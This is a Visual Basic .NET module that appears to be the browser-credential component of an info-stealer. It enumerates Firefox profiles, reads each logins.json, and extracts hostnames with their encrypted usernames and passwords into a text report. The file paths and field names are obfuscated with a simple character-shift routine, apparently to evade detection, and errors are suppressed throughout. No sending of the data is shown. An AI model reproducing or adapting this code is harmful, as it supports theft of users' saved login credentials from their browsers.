Imports System.Runtime.InteropServices
Imports System.Text

Module STFF
    Public Function FF() As String
        Dim toReturn As String = ""
        For Each Dir As String In System.IO.Directory.GetDirectories(Environment.GetEnvironmentVariable("APPDATA") & CodeRotate.RotateRight("WHjudgg\WAdm`ajsWKmjadg`n"))
            Dim dirinfo As New System.IO.DirectoryInfo(Dir)
            Dim result As String
            Dim spath As String = Environ$("APPDATA") & CodeRotate.RotateRight("WHjudgg\WAdm`ajsWKmjadg`nW") & dirinfo.Name & CodeRotate.RotateRight("*gjbdin)enji")
            Dim sFile As String = read.ReadFile(spath)
            Dim sHost As String = Cut(sFile, CodeRotate.RotateRight("cjnoi\h`5"), CodeRotate.RotateRight("'cookM`\gh"))
            Dim sUser As String = Cut(sFile, CodeRotate.RotateRight("'`i^mtko`_Pn`mi\h`5"), CodeRotate.RotateRight("'`i^mtko`_K\nnrjm_5"))
            Dim sPwd As String = Cut(sFile, CodeRotate.RotateRight("`i^mtko`_K\nnrjm_5"), CodeRotate.RotateRight("'bpd_"))
            result = "Host: " + (sHost) + vbNewLine + "user: " + sUser + vbNewLine + "Pass: " + sPwd
            toReturn += result
            'RichTextBox1.text += result
        Next
        Return toReturn
    End Function
    Function Cut(ByVal sInhalt As String, ByVal sText As String, ByVal stext2 As String) As String
        On Error Resume Next
        Dim c() As String
        Dim c2() As String
        c = Split(sInhalt, sText)
        c2 = Split(c(1), stext2)
        Cut = c2(0)
    End Function

    Public Class CodeRotate
        Public Shared Function RotateRight(ByVal [string] As [String]) As [String]
            Dim [retstr] As [String] = [string].Empty
            For i As [Int32] = 0 To [string].Length - 1 Step 1
                [retstr] += Chr(Asc([string].Chars(i)) + 5)
            Next
            Return [retstr]
        End Function
    End Class

    Public Class read
        Public Shared Function ReadFile(ByVal sFile As String) As String
            'Function ReadFil(ByVal sFile As String) As String
            On Error Resume Next
            Dim OpenFile As New System.IO.StreamReader(sFile)
            ReadFile = OpenFile.ReadToEnd.ToString
        End Function
    End Class
End Module